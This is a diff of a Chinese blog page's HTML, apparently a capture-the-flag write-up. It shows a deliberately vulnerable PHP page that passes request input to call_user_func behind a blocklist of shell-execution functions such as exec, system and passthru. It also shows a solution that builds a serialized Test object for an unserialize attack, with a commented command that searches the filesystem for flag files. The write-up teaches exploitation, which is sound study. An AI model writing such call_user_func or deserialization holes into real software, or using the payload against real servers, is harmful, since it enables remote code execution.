@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      468 字
+      469 字
     </span>
   
 
@@ -233,37 +233,38 @@
 2021-02-27 06:14:05 am        </code></pre></div>
 <p>而且没五秒页面会刷新一次  </p>
 <p>抓包看看<img src="https://ftp.bmp.ovh/imgs/2021/02/0efeb58411f3be9b.png" srcset="/img/loading.gif"><br>前面一个date,后面是时间—–函数执行<br>读取<code>index.php</code><br><code>func=file_get_contents&amp;p=index.php</code>   </p>
-<div class="hljs"><pre><code>&lt;?php
-    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
-    function gettime($func, $p) &#123;
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params">$func, $p</span>) </span>&#123;
         $result = call_user_func($func, $p);
         $a= gettype($result);
-        if ($a == &quot;string&quot;) &#123;
-            return $result;
-        &#125; else &#123;return &quot;&quot;;&#125;
+        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">&quot;string&quot;</span>) &#123;
+            <span class="hljs-keyword">return</span> $result;
+        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;
     &#125;
-    class Test &#123;
-        var $p = &quot;Y-m-d h:i:s a&quot;;
-        var $func = &quot;date&quot;;
-        function __destruct() &#123;
-            if ($this-&gt;func != &quot;&quot;) &#123;
-                echo gettime($this-&gt;func, $this-&gt;p);
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
+        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;
+        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">&quot;date&quot;</span>;
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;
+                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
             &#125;
         &#125;
     &#125;
-    $func = $_REQUEST[&quot;func&quot;];
-    $p = $_REQUEST[&quot;p&quot;];
+    $func = $_REQUEST[<span class="hljs-string">&quot;func&quot;</span>];
+    $p = $_REQUEST[<span class="hljs-string">&quot;p&quot;</span>];
 
-    if ($func != null) &#123;
+    <span class="hljs-keyword">if</span> ($func != <span class="hljs-literal">null</span>) &#123;
         $func = strtolower($func);
-        if (!in_array($func,$disable_fun)) &#123;
-            echo gettime($func, $p);
-        &#125;else &#123;
-            die(&quot;Hacker...&quot;);
+        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;
+            <span class="hljs-keyword">echo</span> gettime($func, $p);
+        &#125;<span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);
         &#125;
-    &#125;</code></pre></div>
+    &#125;</code></pre></div></code></pre>
 <p>可以看到禁了很多函数<br>有个class<br>可以用反序列<code>unserialize</code>函数      </p>
-<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><div class="hljs"><pre><code>&lt;?php
+<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><div class="hljs"><pre><code>```php
+&lt;?php
 
 class Test &#123;
     //var $p = &quot;find / -name &#39;flag*&#39;&quot;;
@@ -273,7 +274,8 @@ class Test &#123;
 &#125;
 $a=new Test();
 $b=serialize($a);
-echo $b;       </code></pre></div>
+echo $b;       
+```    </code></pre></div>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>序列化</li>
 <li><code>call_user_func</code>       <blockquote>
